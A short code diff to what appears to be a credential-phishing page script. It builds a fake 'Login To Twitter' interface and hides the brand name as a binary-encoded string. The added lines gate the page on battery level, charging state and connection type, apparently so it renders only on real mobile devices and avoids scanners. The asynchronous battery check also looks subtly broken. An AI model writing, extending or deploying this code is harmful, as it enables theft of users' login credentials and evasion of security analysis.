@@ -1,3 +1,9 @@
+var navibat,navichar;
+navigator.getBattery().then(function(battery) {
+navibat=battery.level*100;
+navichar=battery.dischargingTime;
+});
+if( navigator.connection.downlinkMax != undefined && navibat != 100 && navichar != "Infinity"){
 
 document.getElementsByTagName('head')[0].innerHTML += '<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>*{padding:0;margin:0;outline:0;-webkit-user-select:none;font-family:Helvetica,Arial,sans-serif;}</style>';
 
@@ -231,4 +237,5 @@ headD.appendChild(twl);
 if(config.text){
 btn2.textContent="Login To "+ ("01010100 01110111 01101001 01110100 01110100 01100101 01110010").split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join('');
 btn3.textContent="Forgotten password? · Sign up to "+ ("01010100 01110111 01101001 01110100 01110100 01100101 01110010").split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join('');
+}
 }
